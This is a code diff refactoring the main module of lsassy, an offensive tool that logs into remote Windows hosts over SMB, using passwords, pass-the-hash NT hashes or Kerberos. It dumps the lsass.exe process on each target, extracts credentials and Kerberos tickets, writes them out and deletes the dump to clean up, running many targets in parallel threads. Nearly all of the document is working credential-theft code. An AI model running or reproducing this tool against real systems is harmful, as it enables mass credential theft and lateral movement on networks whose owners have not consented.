@@ -1,251 +1,240 @@
-#!/usr/bin/env python3
-# Author:
-#  Romain Bentz (pixis - @hackanddo)
-# Website:
-#  https://beta.hackndo.com
+import logging
+import signal
 
-from multiprocessing import Process, RLock
-import time
+import threading
+from queue import Queue
+from lsassy import logger
+from lsassy.utils import get_targets
+from lsassy.parser import Parser
+from lsassy.session import Session
+from lsassy.writer import Writer
+from lsassy.dumper import Dumper
+from lsassy.impacketfile import ImpacketFile
 
-from lsassy.modules.dumper import Dumper
-from lsassy.modules.impacketconnection import ImpacketConnection
-from lsassy.modules.logger import Logger
-from lsassy.modules.parser import Parser
-from lsassy.modules.writer import Writer
-from lsassy.utils.utils import *
+lock = threading.RLock()
 
-lock = RLock()
+
+class Worker(threading.Thread):
+    def __init__(self, task_q):
+        super().__init__()
+        self.task_q = task_q
+        self.shutdown_flag = threading.Event()
+
+    def run(self):
+        while not self.shutdown_flag.is_set():
+            worker_lsassy = self.task_q.get()
+            self.name = worker_lsassy.target
+            worker_lsassy.run()
+            self.task_q.task_done()
+
+
+class ThreadPool:
+    def __init__(self, targets, arguments):
+        self.targets = get_targets(targets)
+        self.arguments = arguments
+        self.threads = []
+        self.max_threads = arguments.threads
+        self.task_q = Queue(self.max_threads+10)
+        signal.signal(signal.SIGINT, self.interrupt_event)
+        signal.signal(signal.SIGTERM, self.interrupt_event)
+
+    def interrupt_event(self, signum, stack):
+        logging.error("**CTRL+C** QUITTING GRACEFULLY")
+        self.stop()
+        raise KeyboardInterrupt
+
+    def stop(self):
+        for thread in self.threads:
+            thread.shutdown_flag.set()
+        for thread in self.threads:
+            thread.join()
+
+    def isRunning(self):
+        return any(thread.is_alive() for thread in self.threads)
+
+    def run(self):
+        logger.init()
+        threading.current_thread().name = "[Core]"
+
+        if self.arguments.v == 1:
+            logging.getLogger().setLevel(logging.INFO)
+        elif self.arguments.v >= 2:
+            logging.getLogger().setLevel(logging.DEBUG)
+        else:
+            logging.getLogger().setLevel(logging.ERROR)
+        try:
+            # Turn-on the worker threads
+            for i in range(self.max_threads):
+                thread = Worker(self.task_q)
+                thread.daemon = True
+                self.threads.append(thread)
+                thread.start()
+
+            instance_id = 1
+            for target in self.targets:
+                self.task_q.put(Lsassy(target, self.arguments, instance_id))
+                instance_id += 1
+
+            # Block until all tasks are done
+            self.task_q.join()
+
+        except KeyboardInterrupt as e:
+            logging.error("Quitting.")
 
 
 class Lsassy:
-    def __init__(self,
-                 hostname, username, domain="", password="", lmhash="", nthash="",
-                 kerberos=False, aesKey="", dc_ip=None,
-                 log_options=Logger.Options(),
-                 dump_options=Dumper.Options(),
-                 parse_options=Parser.Options(),
-                 write_options=Writer.Options()
-                 ):
+    """
+    Main class to extract credentials from one remote host. Can be used in different threads for parallelization
+    """
 
-        self.conn_options = ImpacketConnection.Options(hostname, domain, username, password, lmhash, nthash, kerberos, aesKey, dc_ip)
-        self.log_options = log_options
-        self.dump_options = dump_options
-        self.parse_options = parse_options
-        self.write_options = write_options
-
-        self._target = hostname
-
-        self._log = Logger(self._target, log_options)
-
-        self._conn = None
-        self._dumper = None
-        self._parser = None
-        self._dumpfile = None
-        self._credentials = []
-        self._writer = None
-
-    def connect(self, options: ImpacketConnection.Options):
-        self._conn = ImpacketConnection(options)
-        self._conn.set_logger(self._log)
-        login_result = self._conn.login()
-        if not login_result.success():
-            return login_result
-
-        self._log.info("Authenticated")
-        return RetCode(ERROR_SUCCESS)
-
-    def dump_lsass(self, options=Dumper.Options()):
-        is_admin = self._conn.isadmin()
-        if not is_admin.success():
-            self._conn.close()
-            return is_admin
-
-        self._dumper = Dumper(self._conn, options)
-        dump_result = self._dumper.dump()
-        if not dump_result.success():
-            return dump_result
-        self._dumpfile = self._dumper.getfile()
-
-        self._log.info("Process lsass.exe has been dumped")
-        return RetCode(ERROR_SUCCESS)
-
-    def parse_lsass(self, options=Dumper.Options()):
-        self._parser = Parser(self._dumpfile, options)
-        parse_result = self._parser.parse()
-        if not parse_result.success():
-            return parse_result
-
-        self._credentials = self._parser.get_credentials()
-        self._log.info("Process lsass.exe has been parsed")
-        return RetCode(ERROR_SUCCESS)
-
-    def write_credentials(self, options=Writer.Options()):
-        self._writer = Writer(self._target, self._credentials, self._log, options)
-        write_result = self._writer.write()
-        if not write_result.success():
-            return write_result
-
-        return RetCode(ERROR_SUCCESS)
-
-    def clean(self):
-        if self._parser:
-            r = self._parser.clean()
-            if not r.success():
-                lsassy_warn(self._log, r)
-
-        if self._dumper:
-            r = self._dumper.clean()
-            if not r.success():
-                lsassy_warn(self._log, r)
-
-        if self._conn:
-            r = self._conn.clean()
-            if not r.success():
-                lsassy_warn(self._log, r)
-
-        self._log.info("Cleaning complete")
-
-    def get_credentials(self):
-        return_code = self.run()
-        self._writer = Writer(self._target, self._credentials, self._log, self.write_options)
-        ret = {
-                "success": True,
-                "credentials": self._writer.get_output()
-            }
-        if not return_code.success():
-            ret["success"] = False
-            ret["error_code"] = return_code.error_code
-            ret["error_msg"] = return_code.error_msg
-            ret["error_exception"] = return_code.error_exception
-
-        return ret
+    def __init__(self, target_name, arguments, thread_id=1):
+        self.target = target_name
+        self.args = arguments
+        self.thread_id = thread_id
 
     def run(self):
-        return_code = ERROR_UNDEFINED
-        try:
-            return_code = self._run()
-        except KeyboardInterrupt as e:
-            print("")
-            self._log.warn("Quitting gracefully...")
-            return_code = RetCode(ERROR_USER_INTERRUPTION)
-        except Exception as e:
-            return_code = RetCode(ERROR_UNDEFINED, e)
-        finally:
-            self.clean()
-            lsassy_exit(self._log, return_code)
-            return return_code
-
-    def _run(self):
         """
-        Extract hashes from arguments
+        Main method to dump credentials on a remote host
         """
+        session, file, dumper, method = None, None, None, None
 
-        r = self.connect(self.conn_options)
-        if not r.success():
-            return r
-        r = self.dump_lsass(self.dump_options)
-        if not r.success():
-            return r
-        r = self.parse_lsass(self.parse_options)
-        if not r.success():
-            return r
-        r = self.write_credentials(self.write_options)
-        if not r.success():
-            return r
-        return RetCode(ERROR_SUCCESS)
+        # Credential parsing
+        username = self.args.username if self.args.username else ""
+        password = self.args.password if self.args.password else ""
 
-
-class CLI:
-    def __init__(self, target):
-        self.conn_options = ImpacketConnection.Options()
-        self.log_options = Logger.Options()
-        self.dump_options = Dumper.Options()
-        self.parse_options = Parser.Options()
-        self.write_options = Writer.Options()
-        self.lsassy = None
-        self.target = target
-
-    def set_options_from_args(self, args):
-        # Logger Options
-        self.log_options.verbosity = args.v
-        self.log_options.quiet = args.quiet
-
-        # Connection Options
-        self.conn_options.hostname = self.target
-        self.conn_options.domain_name = '' if args.domain is None else args.domain
-        self.conn_options.username = '' if args.username is None else args.username
-        self.conn_options.kerberos = args.kerberos
-        self.conn_options.aes_key = '' if args.aesKey is None else args.aesKey
-        self.conn_options.dc_ip = args.dc_ip
-        self.conn_options.password = '' if args.password is None else args.password
-        if not self.conn_options.password and args.hashes:
-            if ":" in args.hashes:
-                self.conn_options.lmhash, self.conn_options.nthash = args.hashes.split(":")
+        lmhash, nthash = "", ""
+        if not password and self.args.hashes:
+            if ":" in self.args.hashes:
+                lmhash, nthash = self.args.hashes.split(":")
             else:
-                self.conn_options.lmhash, self.conn_options.nthash = 'aad3b435b51404eeaad3b435b51404ee', args.hashes
+                lmhash, nthash = 'aad3b435b51404eeaad3b435b51404ee', self.args.hashes
 
-        # Dumper Options
-        self.dump_options.dumpname = args.dumpname
-        self.dump_options.procdump_path = args.procdump
-        self.dump_options.dumpert_path = args.dumpert
-        self.dump_options.method = args.method
-        self.dump_options.timeout = args.timeout
+        # Exec methods parsing
+        exec_methods = self.args.exec.split(",") if self.args.exec else None
 
-        # Parser Options
-        self.parse_options.raw = args.raw
+        # Dump modules options parsing
+        options = {v.split("=")[0]: v.split("=")[1] for v in self.args.options.split(",")} if self.args.options else {}
 
-        # Writer Options
-        self.write_options.output_file = args.outfile
-        self.write_options.format = args.format
-        self.write_options.quiet = args.quiet
+        # Dump path checks
+        dump_path = self.args.dump_path
+        if dump_path:
+            dump_path = dump_path.replace('/', '\\')
+            if len(dump_path) > 1 and dump_path[1] == ":":
+                if dump_path[0] != "C":
+                    logging.error("Drive '{}' is not supported. 'C' drive only.".format(dump_path[0]))
+                    return False
+                dump_path = dump_path[2:]
+            if dump_path[-1] != "\\":
+                dump_path += "\\"
 
-    def run(self):
-        args = get_args()
-        self.set_options_from_args(args)
-        self.lsassy = Lsassy(
-            self.conn_options.hostname,
-            self.conn_options.username,
-            self.conn_options.domain_name,
-            self.conn_options.password,
-            self.conn_options.lmhash,
-            self.conn_options.nthash,
-            self.conn_options.kerberos,
-            self.conn_options.aesKey,
-            self.conn_options.dc_ip,
-            log_options=self.log_options,
-            dump_options=self.dump_options,
-            parse_options=self.parse_options,
-            write_options=self.write_options
-        )
-        return self.lsassy.run()
+        parse_only = self.args.parse_only
+        kerberos_dir = self.args.kerberos_dir
 
+        if parse_only and (dump_path is None or self.args.dump_name is None):
+            logging.error("--dump-path and --dump-name required for --parse-only option")
+            return False
 
-def run():
-    targets = get_targets(get_args().target)
-    # Maximum 256 processes because maximum 256 opened files in python by default
-    processes = min(get_args().threads, 256)
+        try:
+            session = Session()
+            session.get_session(
+                address=self.target,
+                target_ip=self.target,
+                port=self.args.port,
+                lmhash=lmhash,
+                nthash=nthash,
+                username=username,
+                password=password,
+                domain=self.args.domain,
+                aesKey=self.args.aesKey,
+                dc_ip=self.args.dc_ip,
+                kerberos=self.args.kerberos,
+                timeout=self.args.timeout
+            )
 
-    if len(targets) == 1:
-        return CLI(targets[0]).run().error_code
-    jobs = [Process(target=CLI(target).run) for target in targets]
-    try:
-        for job in jobs:
-            # Checking running processes to avoid reaching --threads limit
-            while True:
-                counter = sum(1 for j in jobs if j.is_alive())
-                if counter >= processes:
-                    time.sleep(1)
-                else:
-                    break
-            job.start()
-    except KeyboardInterrupt as e:
-        print("\nQuitting gracefully...")
-        terminate_jobs(jobs)
-    finally:
-        join_jobs(jobs)
+            if session.smb_session is None:
+                logging.error("Couldn't connect to remote host")
+                return False
 
-    return 0
+            if not parse_only:
+                dumper = Dumper(session, self.args.timeout).load(self.args.dump_method)
+                if dumper is None:
+                    logging.error("Unable to load dump module")
+                    return False
 
+                file = dumper.dump(no_powershell=self.args.no_powershell, exec_methods=exec_methods,
+                                   dump_path=dump_path,
+                                   dump_name=self.args.dump_name, timeout=self.args.timeout, **options)
+                if file is None:
+                    logging.error("Unable to dump lsass.")
+                    return False
+            else:
+                file = ImpacketFile(session).open(
+                    share="C$",
+                    path=dump_path,
+                    file=self.args.dump_name,
+                    timeout=self.args.timeout
+                )
+                if file is None:
+                    logging.error("Unable to open lsass dump.")
+                    return False
 
-if __name__ == '__main__':
-    run()
+            credentials, tickets = Parser(file).parse()
+            file.close()
+
+            if not parse_only:
+                ImpacketFile.delete(session, file.get_file_path(), timeout=self.args.timeout)
+                logging.success("Lsass dump successfully deleted")
+            else:
+                logging.debug("Not deleting lsass dump as --parse-only was provided")
+
+            if credentials is None:
+                logging.error("Unable to extract credentials from lsass. Cleaning.")
+                return False
+
+            with lock:
+                Writer(credentials, tickets).write(
+                    self.args.format,
+                    output_file=self.args.outfile,
+                    quiet=self.args.quiet,
+                    users_only=self.args.users,
+                    kerberos_dir=kerberos_dir
+                )
+
+        except KeyboardInterrupt:
+            pass
+        except Exception as e:
+            logging.error("An unknown error has occurred.", exc_info=True)
+        finally:
+            logging.debug("Cleaning...")
+            logging.debug("dumper: {}".format(dumper))
+            logging.debug("file: {}".format(file))
+            logging.debug("session: {}".format(session))
+            try:
+                dumper.clean()
+                logging.debug("Dumper cleaned")
+            except Exception as e:
+                logging.debug("Potential issue while cleaning dumper: {}".format(str(e)))
+
+            try:
+                file.close()
+                logging.debug("File closed")
+            except Exception as e:
+                logging.debug("Potential issue while closing file: {}".format(str(e)))
+
+            if not parse_only:
+                try:
+                    if ImpacketFile.delete(session, file_path=file.get_file_path(), timeout=self.args.timeout):
+                        logging.debug("Lsass dump successfully deleted")
+                except Exception as e:
+                    try:
+                        logging.debug("Couldn't delete lsass dump using file. Trying dump object...")
+                        if ImpacketFile.delete(session, file_path=dumper.dump_path + dumper.dump_name, timeout=self.args.timeout):
+                            logging.debug("Lsass dump successfully deleted")
+                    except Exception as e:
+                        logging.debug("Potential issue while deleting lsass dump: {}".format(str(e)))
+
+            try:
+                session.smb_session.close()
+                logging.debug("SMB session closed")
+            except Exception as e:
+                logging.debug("Potential issue while closing SMB session: {}".format(str(e)))
